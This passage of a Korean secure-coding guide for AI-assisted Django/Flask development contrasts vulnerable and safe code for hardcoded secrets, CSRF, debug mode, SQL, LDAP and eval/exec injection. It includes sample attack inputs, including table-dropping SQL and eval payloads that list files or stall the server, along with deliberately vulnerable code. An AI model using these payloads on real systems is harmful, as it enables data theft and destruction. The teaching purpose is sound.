# 시큐어코딩 가이드라인 Skills
## Django / Flask 버전

> 바이브 코딩을 하는 모든 사람을 위한 보안 가이드
> 특히 웹사이트를 바이브 코딩해서 퍼블리싱하는 사람들을 위하여

---

# 목차

## PART 1. 시작하기
- **Chapter 1**
  - 1-1. AI가 만든 코드도 취약할 수 있습니다
  - 1-2. 이 가이드의 활용법

## PART 2. 입력값을 믿지 마세요 — 입력데이터 검증
- **Chapter 2. 데이터베이스를 노리는 삽입 공격**
  - 2-1. SQL 삽입(SQL Injection)
  - 2-2. LDAP 삽입(LDAP Injection)
- **Chapter 3. 코드와 명령어를 노리는 삽입 공격**
  - 3-1. 코드 삽입(Code Injection)
  - 3-2. 운영체제 명령어 삽입(OS Command Injection)
  - 3-3. XML 삽입(XML Injection)
  - 3-4. 포맷 스트링 삽입(Format String Injection)
- **Chapter 4. 웹 요청을 노리는 공격**
  - 4-1. 크로스사이트 스크립트(XSS)
  - 4-2. 크로스사이트 요청 위조(CSRF)
  - 4-3. 서버사이드 요청 위조(SSRF)
  - 4-4. HTTP 응답 분할(HTTP Response Splitting)
- **Chapter 5. 파일과 URL을 노리는 공격**
  - 5-1. 경로 조작 및 자원 삽입(Path Traversal & Resource Injection)
  - 5-2. 위험한 형식 파일 업로드(Unrestricted File Upload)
  - 5-3. 신뢰되지 않는 URL 자동 연결(Open Redirect)
  - 5-4. 부적절한 XML 외부 개체 참조(XXE)
- **Chapter 6. 데이터 타입과 보안 결정을 노리는 공격**
  - 6-1. 정수형 오버플로우(Integer Overflow)
  - 6-2. 보안기능 결정에 사용되는 부적절한 입력값
  - 6-3. 메모리 버퍼 오버플로우(Buffer Overflow)

## PART 3. 보안 기능을 제대로 구현하세요
- **Chapter 7. 인증과 인가, 그리고 권한 설정**
  - 7-1. 적절한 인증 없이 중요 기능 허용
  - 7-2. 부적절한 인가
  - 7-3. 중요한 자원에 대한 잘못된 권한 설정
- **Chapter 8. 암호화, 제대로 하고 계십니까**
  - 8-1. 취약한 암호화 알고리즘 사용
  - 8-2. 암호화되지 않은 중요정보
  - 8-3. 하드코딩된 중요정보
  - 8-4. 충분하지 않은 키 길이
- **Chapter 9. 난수, 패스워드, 그리고 인증 방어**
  - 9-1. 적절하지 않은 난수 값 사용
  - 9-2. 취약한 패스워드 허용
  - 9-3. 솔트 없는 일방향 해시 함수 사용
  - 9-4. 반복된 인증시도 제한 기능 부재
- **Chapter 10. 서명, 인증서, 무결성 검증**
  - 10-1. 부적절한 전자서명 확인
  - 10-2. 부적절한 인증서 유효성 검증
  - 10-3. 무결성 검사 없는 코드 다운로드
- **Chapter 11. 정보 노출을 차단하세요**
  - 11-1. 쿠키를 통한 정보 노출
  - 11-2. 주석문 안에 포함된 시스템 주요정보

## PART 4. 안정적인 코드를 작성하세요
- **Chapter 12. 시간 및 상태 — 타이밍이 만드는 버그**
  - 12-1. 경쟁 조건: 검사 시점과 사용 시점(TOCTOU)
  - 12-2. 종료되지 않는 반복문 또는 재귀 함수
- **Chapter 13. 에러 처리 — 오류가 보안 구멍이 되는 순간**
  - 13-1. 오류 메시지 정보 노출
  - 13-2. 오류 상황 대응 부재
  - 13-3. 부적절한 예외 처리
- **Chapter 14. 코드 오류 — 개발자가 놓치기 쉬운 함정들**
  - 14-1. Null Pointer 역참조
  - 14-2. 부적절한 자원 해제
  - 14-3. 신뢰할 수 없는 데이터의 역직렬화

## PART 5. 구조와 설계로 지키세요
- **Chapter 15. 캡슐화 — 보여서는 안 되는 것들**
  - 15-1. 잘못된 세션에 의한 데이터 정보 노출
  - 15-2. 제거되지 않고 남은 디버그 코드
- **Chapter 16. API 오용 — 편리함 뒤에 숨은 위험**
  - 16-1. 취약한 API 사용

## PART 6. 바이브 코딩 보안 체크리스트
- **Chapter 17**
  - 17-1. 배포 전 보안 체크리스트
  - 17-2. AI에게 보안 검토 요청하는 프롬프트 예시
  - 17-3. 자주 발생하는 바이브 코딩 보안 실수 TOP 10

---

# PART 1. 시작하기

# Chapter 1

---

## 1-1. AI가 만든 코드도 취약할 수 있습니다

### 개요

바이브 코딩(Vibe Coding)의 시대가 열렸습니다. Cursor, Claude Code, GitHub Copilot 같은 AI 도구를 활용하면 몇 시간 만에 웹사이트를 완성할 수 있습니다. 프롬프트 몇 줄로 로그인 시스템을 구축하고, 데이터베이스를 연결하며, 결제 기능까지 구현할 수 있는 시대입니다. 그러나 여기에는 심각한 함정이 숨어 있습니다. **AI가 생성한 코드가 정상적으로 동작한다고 해서 안전한 것은 아닙니다.**

이 장에서는 AI 도구가 왜 보안에 취약한 코드를 생성할 수 있는지, 그리고 바이브 코더(Vibe Coder)인 여러분이 왜 보안에 관심을 가져야 하는지 설명합니다.

### 왜 위험한가

AI 코드 생성 도구는 방대한 양의 오픈소스 코드와 온라인 튜토리얼을 학습하여 만들어졌습니다. 문제는 이 학습 데이터 자체에 보안 취약점이 포함된 코드가 상당수 존재한다는 것입니다. Stack Overflow의 답변, GitHub의 예제 코드, 블로그 튜토리얼 등 많은 자료가 **"동작하는 코드"**에 초점을 맞추고 있으며, 보안은 후순위로 밀려 있습니다.

2023년 스탠퍼드 대학교의 연구에 따르면, AI 코드 어시스턴트를 사용한 개발자가 작성한 코드는 그렇지 않은 개발자의 코드보다 보안 취약점이 더 많이 발견되었습니다. 더 우려스러운 점은, AI 도구를 사용한 개발자들이 자신의 코드가 더 안전하다고 **잘못 확신**하는 경향이 있었다는 것입니다.

바이브 코딩 환경에서 보안 취약점이 발생하는 주요 원인은 다음과 같습니다.

1. **학습 데이터의 편향**: AI는 보안이 취약한 코드 패턴도 학습합니다
2. **맥락의 부재**: AI는 여러분의 서비스가 어떤 위협에 노출되는지 모릅니다
3. **과신 효과**: "AI가 만들었으니 괜찮겠지"라는 심리가 코드 리뷰를 생략하게 합니다
4. **프롬프트의 한계**: "로그인 기능 만들어줘"라고 요청하면 AI는 동작하는 코드를 만들지, 안전한 코드를 만들지 않습니다

### 실제 사례: AI가 생성하는 취약한 코드 패턴

#### 사례 1: 하드코딩된 비밀키(Hardcoded Secrets)

AI에게 "JWT 인증 기능을 만들어줘"라고 요청하면 다음과 같은 코드를 생성하는 경우가 매우 빈번합니다.

❌ 취약한 코드

```python
import jwt
from flask import Flask, request, jsonify

app = Flask(__name__)

# AI가 생성한 코드 - 비밀키가 소스코드에 하드코딩되어 있습니다
SECRET_KEY = "super-secret-key-12345"

@app.route('/login', methods=['POST'])
def login():
    username = request.json['username']
    password = request.json['password']

    # 비밀번호 평문 비교 - 또 다른 취약점
    if username == "admin" and password == "admin123":
        token = jwt.encode({"user": username}, SECRET_KEY, algorithm="HS256")
        return jsonify({"token": token})

    return jsonify({"error": "Invalid credentials"}), 401
```

이 코드에는 최소 세 가지 심각한 보안 문제가 있습니다.

- `SECRET_KEY`가 소스코드에 직접 작성되어 있어 Git 저장소에 노출됩니다
- 비밀번호를 평문(Plain Text)으로 비교합니다
- 관리자 계정 정보가 코드에 하드코딩되어 있습니다

✅ 안전한 코드

```python
import jwt
import os
import bcrypt
from flask import Flask, request, jsonify

app = Flask(__name__)

# 환경 변수에서 비밀키를 읽어옵니다 (자세한 내용은 8장 8-3절에서 다룹니다)
SECRET_KEY = os.environ.get("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("JWT_SECRET_KEY 환경 변수가 설정되지 않았습니다.")

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username', '')
    password = request.json.get('password', '')

    # 데이터베이스에서 사용자 조회
    user = db.users.find_one({"username": username})
    if not user:
        return jsonify({"error": "Invalid credentials"}), 401

    # bcrypt로 해시된 비밀번호 비교 (자세한 내용은 9장 9-3절에서 다룹니다)
    if bcrypt.checkpw(password.encode('utf-8'), user['password_hash']):
        token = jwt.encode(
            {"user": username, "exp": datetime.utcnow() + timedelta(hours=1)},
            SECRET_KEY,
            algorithm="HS256"
        )
        return jsonify({"token": token})

    return jsonify({"error": "Invalid credentials"}), 401
```

> **⚠️ 주의:** AI 도구에게 인증 관련 코드를 요청할 때는 반드시 "환경 변수에서 비밀키를 로드하고, bcrypt로 비밀번호를 해싱하라"고 명시적으로 지시하십시오. 명시하지 않으면 AI는 거의 확실하게 하드코딩된 값을 사용합니다.

#### 사례 2: SQL 삽입(SQL Injection)

"사용자 검색 기능을 만들어줘"라는 프롬프트에 AI가 생성하는 전형적인 코드입니다.

❌ 취약한 코드

```python
@app.route('/search')
def search_user():
    username = request.args.get('username')

    # 문자열 포매팅으로 직접 SQL 쿼리 구성 - SQL 삽입 취약점
    query = f"SELECT * FROM users WHERE username = '{username}'"
    result = db.execute(query)

    return jsonify(result.fetchall())
```

공격자가 `username` 파라미터에 `' OR '1'='1' --`을 입력하면 전체 사용자 데이터가 유출됩니다. `'; DROP TABLE users; --`를 입력하면 사용자 테이블 전체가 삭제됩니다.

✅ 안전한 코드

```python
@app.route('/search')
def search_user():
    username = request.args.get('username', '')

    # 매개변수화된 쿼리(Parameterized Query) 사용
    query = "SELECT id, username, email FROM users WHERE username = ?"
    result = db.execute(query, (username,))

    return jsonify(result.fetchall())
```

> **💡 팁:** AI에게 데이터베이스 쿼리 코드를 요청할 때는 "반드시 매개변수화된 쿼리(Parameterized Query) 또는 ORM을 사용하라"고 지시하십시오.

#### 사례 3: 크로스사이트 요청 위조(CSRF) 토큰 누락

AI에게 "회원 정보 수정 폼을 만들어줘"라고 요청하면 다음과 같은 코드가 생성되기도 합니다.

❌ 취약한 코드

```html
<form action="/update-profile" method="POST">
    <input type="text" name="email" value="{{ user.email }}">
    <input type="text" name="nickname" value="{{ user.nickname }}">
    <button type="submit">수정하기</button>
</form>
```

이 폼에는 CSRF(Cross-Site Request Forgery) 토큰이 없습니다. 공격자가 악의적인 웹사이트에서 사용자 모르게 이 폼을 제출하도록 유도할 수 있습니다.

✅ 안전한 코드

```html
<form action="/update-profile" method="POST">
    <!-- CSRF 토큰 포함 -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" name="email" value="{{ user.email }}">
    <input type="text" name="nickname" value="{{ user.nickname }}">
    <button type="submit">수정하기</button>
</form>
```

```python
# Flask 서버 측 CSRF 보호 설정
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
csrf = CSRFProtect(app)
```

#### 사례 4: 디버그 모드 배포

AI가 생성한 Flask 또는 Django 프로젝트의 실행 코드에는 거의 항상 디버그 모드가 활성화되어 있습니다.

❌ 취약한 코드

```python
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

디버그 모드(Debug Mode)가 활성화된 상태로 배포하면 상세한 에러 메시지, 스택 트레이스(Stack Trace), 심지어 대화형 디버거까지 외부에 노출됩니다.

✅ 안전한 코드

```python
import os

if __name__ == '__main__':
    debug_mode = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    app.run(debug=debug_mode, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
```

### 바이브 코딩 시 체크포인트

여러분이 AI 도구로 웹사이트를 만들 때 반드시 확인해야 할 핵심 사항을 정리합니다.

- [ ] AI가 생성한 코드에 비밀키, API 키, 비밀번호가 하드코딩되어 있지 않은지 확인하십시오
- [ ] 데이터베이스 쿼리가 문자열 결합이 아닌 매개변수화된 쿼리로 작성되어 있는지 확인하십시오
- [ ] 모든 POST 폼에 CSRF 토큰이 포함되어 있는지 확인하십시오
- [ ] 디버그 모드가 프로덕션 환경에서 비활성화되어 있는지 확인하십시오
- [ ] AI에게 코드를 요청할 때 보안 요구사항을 프롬프트에 명시하십시오

> **💡 팁:** AI 도구를 사용할 때 프롬프트 끝에 항상 "보안 모범 사례(Security Best Practices)를 따라줘"를 추가하는 습관을 기르십시오. 이것만으로도 AI가 생성하는 코드의 보안 품질이 크게 향상됩니다.

---

## 1-2. 이 가이드의 활용법

### 개요

이 가이드는 바이브 코딩으로 웹사이트를 만드는 여러분을 위해 설계되었습니다. 전문 보안 엔지니어가 아니더라도 이해할 수 있도록 모든 내용을 실용적이고 구체적으로 구성하였습니다. 이 절에서는 가이드의 전체 구조와 효과적인 활용 방법을 안내합니다.

### 가이드의 전체 구조

이 책은 6개의 PART로 구성되어 있습니다.

| PART | 제목 | 내용 |
|------|------|------|
| **PART 1** | 시작하기 | 왜 바이브 코딩에도 보안이 필요한가, 이 가이드의 활용법 |
| **PART 2** | 입력값을 믿지 마세요 | SQL 삽입, XSS, CSRF 등 입력데이터 검증 |
| **PART 3** | 보안 기능을 제대로 구현하세요 | 인증, 인가, 암호화, 패스워드, 민감정보 보호 |
| **PART 4** | 안정적인 코드를 작성하세요 | 경쟁조건, 에러처리, 코드오류 |
| **PART 5** | 구조와 설계로 지키세요 | 캡슐화, API 오용 |
| **PART 6** | 바이브 코딩 보안 체크리스트 | 배포 전 점검, AI 프롬프트, TOP 10 실수 |

PART 2부터 PART 5까지는 웹 애플리케이션의 주요 보안 취약점 카테고리를 다룹니다. 각 장은 하나의 취약점 유형을 깊이 있게 설명하며, 모두 동일한 구조를 따릅니다. PART 6은 실전에서 바로 활용할 수 있는 체크리스트와 도구를 제공합니다.

### 각 장의 구조

이 가이드의 모든 보안 주제는 다음과 같은 일관된 구조로 작성되어 있습니다.

#### 1단계: 개요

해당 보안 취약점이 무엇인지 간결하게 설명합니다. 전문 용어를 처음 사용할 때는 한글과 영어를 함께 표기합니다. 예를 들어, "크로스사이트 스크립트(Cross-Site Scripting, XSS)"과 같이 작성됩니다.

#### 2단계: 왜 위험한가

이 취약점이 실제로 어떤 피해를 초래할 수 있는지 설명합니다. 추상적인 위험이 아닌, 바이브 코딩 환경에서 실제로 발생할 수 있는 구체적인 시나리오를 다룹니다.

#### 3단계: 취약한 코드 vs. 안전한 코드

모든 주제에서 다음과 같은 코드 비교 형식을 사용합니다.

- **❌ 취약한 코드** — AI가 흔히 생성하는, 보안에 취약한 코드 예시입니다
- **✅ 안전한 코드** — 같은 기능을 안전하게 구현한 코드 예시입니다

코드 예시는 주로 Python(Flask/Django)과 JavaScript(Node.js/Express)로 작성되어 있으며, 바이브 코딩에서 가장 많이 사용되는 기술 스택을 반영하였습니다.

#### 4단계: 바이브 코딩 시 체크포인트

각 장의 마지막에는 해당 취약점에 대한 체크리스트가 제공됩니다. 이 체크리스트를 배포 전에 확인하면 해당 취약점을 효과적으로 예방할 수 있습니다.

### 이 가이드를 읽는 두 가지 방법

#### 방법 1: 처음부터 끝까지 순서대로 읽기

보안에 대한 기초 지식이 부족하다고 느끼는 분께 권장합니다. PART 1에서 기본 개념을 이해한 후 PART 2부터 순서대로 읽어나가면 웹 보안에 대한 체계적인 이해를 쌓을 수 있습니다. 이 방법은 약 1~2주 정도의 시간이 소요됩니다.

#### 방법 2: 필요한 부분만 골라 읽기

이미 웹 개발 경험이 있거나, 특정 보안 이슈를 해결해야 하는 분께 권장합니다. 목차에서 해당 주제를 찾아 바로 이동하십시오. 각 장은 독립적으로 읽을 수 있도록 구성되어 있습니다.

예를 들어, 다음과 같은 상황별 추천 경로가 있습니다.

| 상황 | 추천 챕터 |
|------|-----------|
| 로그인 기능을 AI로 만들었다 | 7장 (PART 3) |
| API 키를 코드에 넣었다 | 8장 8-3절 (PART 3) |
| 파일 업로드 기능을 추가했다 | 5장 5-2절 (PART 2) |
| 배포 직전이다 | 17장 (PART 6) |
| 에러가 나는데 그냥 배포했다 | 13장 (PART 4) |

> **💡 팁:** 바이브 코딩으로 만든 프로젝트를 배포하기 직전이라면, 먼저 PART 6의 체크리스트(Chapter 17)로 이동하여 빠르게 점검한 후, 체크리스트에서 "불합격"인 항목의 해당 챕터를 참고하는 것이 가장 효율적입니다.

### AI 도구와 함께 이 가이드 활용하기

이 가이드의 가장 큰 특징은 AI 도구와 함께 사용하도록 설계되었다는 점입니다. 다음과 같은 워크플로를 권장합니다.

**1단계: AI로 코드 생성**
Cursor, Claude Code, Copilot 등으로 원하는 기능의 코드를 생성합니다.

**2단계: 이 가이드로 보안 점검**
생성된 코드를 이 가이드의 해당 챕터와 대조하여 취약점이 있는지 확인합니다.

**3단계: AI에게 보안 개선 요청**
발견된 취약점을 AI에게 명시적으로 알려주고 수정을 요청합니다. PART 6에 준비된 프롬프트 템플릿을 활용하십시오.

**4단계: 체크리스트로 최종 확인**
배포 전 PART 6의 체크리스트를 통해 전체적인 보안 상태를 최종 점검합니다.

### 이 가이드에서 다루지 않는 것

이 가이드는 바이브 코딩으로 만든 웹 애플리케이션의 보안에 집중합니다. 다음 주제는 이 가이드의 범위에 포함되지 않습니다.

- 네트워크 보안(방화벽, VPN 등)의 심화 설정
- 모바일 네이티브 앱의 보안
- 대규모 엔터프라이즈 환경의 보안 아키텍처
- 침투 테스트(Penetration Testing) 방법론의 상세 내용

이러한 주제가 필요한 경우 OWASP(Open Web Application Security Project)의 공식 가이드라인을 참고하시기 바랍니다.

### 바이브 코딩 시 체크포인트

- [ ] 이 가이드의 PART 구조를 이해하고, 자신에게 맞는 읽기 방법을 선택하였는지 확인하십시오
- [ ] AI로 코드를 생성한 후 반드시 보안 점검 단계를 거치는 습관을 만드십시오
- [ ] PART 6의 체크리스트를 북마크하여 배포 전 언제든 참조할 수 있도록 하십시오
- [ ] AI에게 코드를 요청할 때 보안 요구사항을 프롬프트에 포함하는 것을 기본 원칙으로 삼으십시오

> **⚠️ 주의:** 이 가이드를 읽는 것만으로는 보안이 보장되지 않습니다. 반드시 자신의 코드에 직접 적용하고, 체크리스트를 통해 확인하는 실천이 필요합니다. 보안은 한 번의 작업이 아니라 지속적인 과정입니다.

---

# PART 2. 입력값을 믿지 마세요 — 입력데이터 검증

# Chapter 02. 데이터베이스를 노리는 삽입 공격

## 2-1. SQL 삽입(SQL Injection)

### SQL 삽입 공격 흐름도

#### ❌ 취약한 흐름 (문자열 결합 방식)

```
 ┌─────────────┐         ┌─────────────────┐         ┌──────────────────┐         ┌─────────────┐
 │  공격자      │         │   웹 애플리케이션  │         │   조합된 SQL 쿼리  │         │  데이터베이스  │
 │             │         │  (검증 없음)      │         │                  │         │             │
 │ 입력값:      │         │                 │         │ SELECT * FROM    │         │ ⚠ 전체 데이터 │
 │ ' OR 1=1 -- │ ══════▶ │ 입력값을 그대로   │ ══════▶ │ users WHERE id=  │ ══════▶ │   유출됨!    │
 │             │         │ 쿼리에 삽입      │         │ '' OR 1=1 --'   │         │             │
 └─────────────┘         └─────────────────┘         └──────────────────┘         └─────────────┘
       ①                        ②                          ③                          ④
   악성 입력 전송           입력값 검증 없이              공격 구문이 SQL에            모든 사용자 정보
                          문자열 결합 수행              그대로 포함됨               무단 조회 성공
```

#### ✅ 안전한 흐름 (파라미터화된 쿼리 방식)

```
 ┌─────────────┐         ┌─────────────────┐         ┌──────────────────┐         ┌─────────────┐
 │  공격자      │         │   웹 애플리케이션  │         │  파라미터화된 쿼리  │         │  데이터베이스  │
 │             │         │ (Prepared Stmt)  │         │                  │         │             │
 │ 입력값:      │         │                 │         │ SELECT * FROM    │         │ ✅ 정상 동작  │
 │ ' OR 1=1 -- │ ──────▶ │ 입력값을 매개변수  │ ──────▶ │ users WHERE id=? │ ──────▶ │   결과 없음   │
 │             │         │ 로 바인딩        │         │ 값: "' OR 1=1 --"│         │  (공격 차단)  │
 └─────────────┘         └─────────────────┘         └──────────────────┘         └─────────────┘
       ①                        ②                          ③                          ④
   동일한 악성 입력          입력값을 데이터로만           SQL 구조와 데이터가          악성 입력이 단순
                          처리 (코드로 해석 안 함)       완전히 분리됨               문자열로 처리됨
```

#### 핵심 차이점

```
  ┌───────────────────────────────────────────────────────────────┐
  │                     문자열 결합 (위험)                         │
  │  "SELECT * FROM users WHERE id='" + 입력값 + "'"             │
  │  ══════▶  입력값이 SQL 코드로 실행됨                           │
  └───────────────────────────────────────────────────────────────┘

  ┌───────────────────────────────────────────────────────────────┐
  │                   파라미터 바인딩 (안전)                        │
  │  "SELECT * FROM users WHERE id=?"  +  매개변수: 입력값         │
  │  ──────▶  입력값이 항상 데이터로만 처리됨                        │
  └───────────────────────────────────────────────────────────────┘
```

### 개요

SQL 삽입(SQL Injection)은 웹 보안 취약점 중 가장 오래되고 가장 치명적인 공격 중 하나입니다. 데이터베이스(Database)와 연동된 웹 애플리케이션에서 사용자 입력값에 대한 유효성 검증을 하지 않을 경우, 공격자가 입력 폼이나 URL 파라미터에 SQL 문을 삽입하여 데이터베이스의 정보를 열람하거나 조작할 수 있습니다.

바이브 코딩(Vibe Coding)으로 웹사이트를 만들 때, AI가 생성한 코드에서 데이터베이스 쿼리 부분을 특히 주의 깊게 살펴봐야 합니다. AI 도구가 때로는 편의를 위해 문자열 결합(String Concatenation) 방식으로 쿼리를 생성하는 경우가 있기 때문입니다.

### 왜 위험한가

SQL 삽입 공격이 성공하면 공격자는 다음과 같은 행위를 할 수 있습니다:

- **데이터 유출**: 회원 정보, 비밀번호, 개인정보 등 전체 데이터베이스 내용을 탈취할 수 있습니다
- **데이터 변조**: 게시글 수정, 회원 정보 변경, 관리자 권한 획득 등이 가능합니다
- **데이터 삭제**: `DROP TABLE` 등의 명령으로 전체 데이터를 삭제할 수 있습니다
- **서버 장악**: 일부 데이터베이스에서는 운영체제 명령어 실행까지 가능합니다

예를 들어, 로그인 폼에서 비밀번호 입력란에 `' OR '1'='1` 이라고 입력하면, 원래 의도된 쿼리가 완전히 다른 의미로 변환됩니다:

```sql
-- 원래 의도된 쿼리
SELECT * FROM users WHERE username='admin' AND password='입력값'

-- 공격자의 입력으로 변조된 쿼리
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
```

조건절 `'1'='1'`은 항상 참이므로 비밀번호 없이 로그인에 성공하게 됩니다.

### 취약한 코드

#### ❌ 취약한 코드: DB API에서 문자열 결합 사용

```python
from django.shortcuts import render
from django.db import connection

def update_board(request):
    dbconn = connection
    with dbconn.cursor() as curs:
        # 외부로부터 입력받은 값을 검증 없이 사용
        name = request.POST.get('name', '')
        content_id = request.POST.get('content_id', '')

        # 문자열 결합으로 쿼리를 생성하면 SQL 삽입에 취약합니다
        sql_query = "update board set name='" + name + "' where content_id='" + content_id + "'"
        curs.execute(sql_query)
        dbconn.commit()

    return render(request, '/success.html')
```

이 코드에서 `content_id` 값으로 `a' OR 'a'='a`를 입력하면, 조건절이 `content_id='a' OR 'a'='a'`로 바뀌어 board 테이블의 **모든 레코드**가 변경됩니다.

> **⚠️ 주의:** AI 도구에 "게시판 수정 기능 만들어줘"라고 요청하면, 간혹 위와 같은 문자열 결합 방식의 코드가 생성될 수 있습니다. 특히 "간단한 예제"를 요청하면 보안이 생략되는 경우가 많습니다.

#### ❌ 취약한 코드: Django ORM의 raw() 함수 오용

```python
from django.shortcuts import render
from app.models import Member

def member_search(request):
    name = request.POST.get('name', '')

    # raw() 함수에 문자열 결합으로 쿼리를 전달하면 취약합니다
    query = "select * from member where name='" + name + "'"
    data = Member.objects.raw(query)

    return render(request, '/member_list.html', {'member_list': data})
```

Django의 ORM(Object-Relational Mapping)을 사용하면서도 `raw()` 함수를 쓸 때 문자열 결합을 하면 ORM의 보호 기능이 완전히 무력화됩니다.

### 안전한 코드

#### ✅ 안전한 코드: 인자화된 쿼리(Parameterized Query) 사용

```python
from django.shortcuts import render
from django.db import connection

def update_board(request):
    dbconn = connection
    with dbconn.cursor() as curs:
        name = request.POST.get('name', '')
        content_id = request.POST.get('content_id', '')

        # 인자화된 쿼리를 사용합니다 (%s는 플레이스홀더)
        sql_query = 'update board set name=%s where content_id=%s'
        # execute()의 두 번째 인자로 값을 바인딩합니다
        curs.execute(sql_query, (name, content_id))
        dbconn.commit()

    return render(request, '/success.html')
```

인자화된 쿼리(Parameterized Query)를 사용하면 사용자 입력값이 SQL 구문이 아닌 **순수한 데이터**로만 처리됩니다. 공격자가 어떤 값을 넣더라도 쿼리 구조 자체는 변경할 수 없습니다.

#### ✅ 안전한 코드: Django ORM raw() 함수의 올바른 사용

```python
from django.shortcuts import render
from app.models import Member

def member_search(request):
    name = request.POST.get('name', '')

    # 인자화된 쿼리와 바인딩 변수를 사용합니다
    query = 'select * from member where name=%s'
    data = Member.objects.raw(query, [name])

    return render(request, '/member_list.html', {'member_list': data})
```

#### ✅ 가장 안전한 코드: Django ORM QuerySet 활용

```python
from django.shortcuts import render
from app.models import Member

def member_search(request):
    name = request.POST.get('name', '')

    # Django ORM의 QuerySet은 자동으로 인자화된 쿼리를 생성합니다
    data = Member.objects.filter(name=name)

    return render(request, '/member_list.html', {'member_list': data})
```

> **💡 팁:** Django ORM의 `filter()`, `get()`, `exclude()` 등의 QuerySet 메서드를 사용하면 프레임워크(Framework)가 자동으로 SQL 삽입을 방지합니다. 가능한 한 ORM의 기본 기능을 활용하는 것이 가장 안전합니다.

#### ✅ 안전한 코드: SQLite에서의 인자화된 쿼리

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('mydb.sqlite3')
    cursor = conn.cursor()

    # ? 플레이스홀더 사용 (SQLite 방식)
    cursor.execute('SELECT * FROM users WHERE username=?', (username,))
    result = cursor.fetchone()

    conn.close()
    return result
```

SQLite에서는 `?`를 플레이스홀더(Placeholder)로 사용하거나, `:name` 형식의 Named Placeholder를 사용할 수 있습니다.

### 바이브 코딩 시 체크포인트

AI 도구로 데이터베이스 관련 코드를 생성할 때 다음 항목을 반드시 확인하십시오:

- [ ] **문자열 결합으로 SQL 쿼리를 만들고 있지 않은가?** `+` 연산자나 f-string으로 쿼리를 조합하는 코드는 모두 위험합니다
- [ ] **ORM의 기본 기능을 사용하고 있는가?** Django의 `filter()`, `get()`, SQLAlchemy의 `query()` 등 ORM 기본 메서드가 가장 안전합니다
- [ ] **raw SQL이 꼭 필요한가?** 복잡한 쿼리라도 대부분 ORM으로 표현할 수 있습니다. `raw()`, `execute()` 사용은 최소화하십시오
- [ ] **인자화된 쿼리를 사용하고 있는가?** raw SQL이 불가피한 경우 반드시 `%s`, `?`, `:name` 등의 플레이스홀더와 바인딩을 사용하십시오
- [ ] **AI에게 보안 요구사항을 명시했는가?** 프롬프트에 "SQL 삽입 방지를 위해 파라미터 바인딩을 사용해줘"라고 명시하면 훨씬 안전한 코드가 생성됩니다

> **💡 팁:** AI 도구에 코드를 요청할 때 "Django ORM을 사용해서 안전하게 만들어줘"라고 추가하면, 대부분 ORM 기반의 안전한 코드를 생성합니다. "raw SQL 없이"라는 조건을 붙이는 것도 좋은 방법입니다.

---

## 2-2. LDAP 삽입(LDAP Injection)

> **📦 기타 삽입 공격 — LDAP 삽입**
>
> **우선순위: 낮음** — 대부분의 바이브 코딩 프로젝트에서는 LDAP를 직접 다루는 경우가 드뭅니다. 하지만 기업용 사내 시스템이나 Active Directory 연동 기능을 구현할 때는 주의가 필요합니다.
>
> **LDAP(Lightweight Directory Access Protocol)**은 조직 내 사용자 정보를 관리하는 디렉터리 서비스 프로토콜입니다. SQL 삽입과 동일한 원리로, 사용자 입력값이 LDAP 쿼리문에 검증 없이 포함되면 공격자가 쿼리 구조를 변경하여 권한 상승이나 정보 유출을 시도할 수 있습니다.
>
> **핵심 방어 방법:**
> - `ldap3` 라이브러리 사용 시 `escape_filter_chars()` 함수로 입력값을 이스케이프(Escape) 처리합니다
> - 화이트리스트(Whitelist) 방식으로 검색 가능한 값을 제한합니다
>
> ```python
> # ❌ 취약한 코드
> search_str = '(&(objectclass=%s))' % search_keyword
>
> # ✅ 안전한 코드
> from ldap3.utils.conv import escape_filter_chars
> escaped = escape_filter_chars(search_keyword)
> search_str = '(&(objectclass=%s))' % escaped
> ```
>
> AI 도구가 LDAP 관련 코드를 생성할 때는 반드시 입력값 이스케이프 처리가 포함되어 있는지 확인하십시오.


---

# Chapter 03. 코드와 명령어를 노리는 삽입 공격

## 3-1. 코드 삽입(Code Injection)

### 개요

코드 삽입(Code Injection)은 공격자가 애플리케이션에 임의의 프로그래밍 코드를 삽입하여 실행시키는 공격입니다. SQL 삽입이 데이터베이스를 대상으로 한다면, 코드 삽입은 **프로그래밍 언어 자체**를 대상으로 합니다.

파이썬(Python)에서 코드 삽입 공격을 유발하는 대표적인 함수는 `eval()`과 `exec()`입니다. 이 함수들은 문자열을 코드로 해석하여 실행하는 기능을 제공하며, 바이브 코딩 시 AI가 "동적으로 값을 계산해줘"라는 요청에 이 함수들을 사용하는 코드를 생성하는 경우가 있어 각별한 주의가 필요합니다.

### 왜 위험한가

`eval()`이나 `exec()` 함수에 사용자 입력값이 그대로 전달되면, 공격자는 서버에서 **어떤 파이썬 코드든** 실행할 수 있습니다:

- **시스템 정보 탈취**: `__import__('platform').system()` 입력으로 서버 OS 정보 노출
- **파일 시스템 접근**: `__import__('os').listdir('/')` 입력으로 서버 파일 목록 조회
- **원격 쉘 실행**: 공격자가 서버에 원격으로 접속하여 완전한 제어권을 획득
- **서비스 거부**: `time.sleep(99999)` 등으로 서버를 마비시키는 것도 가능

예를 들어, 공격자가 다음과 같은 값을 입력하면 서버가 20초 동안 응답 불능 상태에 빠집니다:

```text
compile('for x in range(1):\n import time\n time.sleep(20)','a','single')
```

### 취약한 코드

#### ❌ 취약한 코드: eval() 함수에 외부 입력값 직접 전달

```python
from django.shortcuts import render

def route(request):
    # 외부에서 입력받은 값을 검증 없이 사용
    message = request.POST.get('message', '')

    # eval() 함수에 사용자 입력을 그대로 전달하면
    # 임의의 파이썬 코드가 실행될 수 있습니다
    ret = eval(message)
    return render(request, '/success.html', {'data': ret})
```

#### ❌ 취약한 코드: exec() 함수로 동적 함수 호출

```python
from django.shortcuts import render

def request_rest_api(request):
    function_name = request.POST.get('function_name', '')

    # 사용자에게 전달받은 함수명을 검증하지 않고 실행
    # "__import__('platform').system()" 등을 입력하면
    # 시스템 정보가 노출됩니다
    exec('{}()'.format(function_name))
    return render(request, '/success.html')
```

